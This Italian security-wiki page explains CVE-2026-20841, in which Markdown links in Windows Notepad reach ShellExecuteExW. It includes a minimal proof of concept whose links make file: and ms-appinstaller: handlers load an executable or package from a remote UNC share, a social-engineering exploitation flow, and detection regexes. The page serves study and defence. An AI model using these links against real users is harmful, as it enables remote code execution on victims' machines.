# Abuso di Windows Protocol Handler / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Le moderne applicazioni Windows che eseguono il rendering di Markdown/HTML spesso trasformano i link forniti dall'utente in elementi cliccabili e li passano a `ShellExecuteExW`. In assenza di una rigida allowlist degli scheme, è possibile attivare qualsiasi protocol handler registrato (ad esempio `file:`, `ms-appinstaller:`), causando l'esecuzione di codice nel contesto dell'utente corrente.<sup>[[1]](#references)</sup>

## Superficie di attacco di ShellExecuteExW nella modalità Markdown di Windows Notepad
- Notepad seleziona la modalità Markdown **solo per le estensioni `.md`** tramite un confronto di stringhe fisso in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Link Markdown supportati:
- Standard: `[text](target)`
- Autolink: `<target>` (renderizzato come `[target](target)`), quindi entrambe le sintassi sono rilevanti per i payload e i rilevamenti.
- I clic sui link vengono elaborati in `sub_140170F60()`, che esegue un filtraggio debole e quindi chiama `ShellExecuteExW`.
- `ShellExecuteExW` inoltra la richiesta a **qualsiasi protocol handler configurato**, non solo HTTP(S).<sup>[[1]](#references)</sup>

### Considerazioni sui payload
- Qualsiasi sequenza `\\` nel link viene **normalizzata in `\`** prima di `ShellExecuteExW`, influenzando la creazione di UNC/path e il rilevamento.
- I file `.md` **non sono associati a Notepad per impostazione predefinita**; la vittima deve comunque aprire il file in Notepad e fare clic sul link, ma una volta eseguito il rendering, il link è cliccabile.
- Scheme di esempio pericolosi:<sup>[[1]](#references)</sup>
- `file://` per avviare un payload locale/UNC.
- `ms-appinstaller://` per attivare i flussi di App Installer. Anche altri scheme registrati localmente potrebbero essere sfruttabili.

### PoC Markdown minimo
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flusso di exploitation
1. Crea un file **`.md`** in modo che Notepad lo visualizzi come Markdown.
2. Incorpora un link utilizzando uno schema URI pericoloso (`file:`, `ms-appinstaller:` o qualsiasi handler installato).
3. Distribuisci il file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o simili) e convinci l’utente ad aprirlo in Notepad.
4. Al clic, il **link normalizzato** viene passato a `ShellExecuteExW` e il protocol handler corrispondente esegue il contenuto referenziato nel contesto dell’utente.<sup>[[1]](#references)[[2]](#references)</sup>

## Idee per il rilevamento
- Monitora i trasferimenti di file `.md` sulle porte/protocolli comunemente utilizzati per distribuire documenti: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizza i link Markdown (standard e autolink) e cerca `file:` o `ms-appinstaller:` **senza distinzione tra maiuscole e minuscole**.
- Espressioni regolari consigliate dai vendor per rilevare l’accesso a risorse remote:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Il comportamento della patch, secondo quanto riferito, inserisce in una **allowlist** i file locali e HTTP(S); qualsiasi altra cosa che raggiunga `ShellExecuteExW` è sospetta. Estendi le rilevazioni ad altri gestori di protocollo installati secondo necessità, poiché la superficie di attacco varia a seconda del sistema.<sup>[[1]](#references)</sup>

## Riferimenti
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
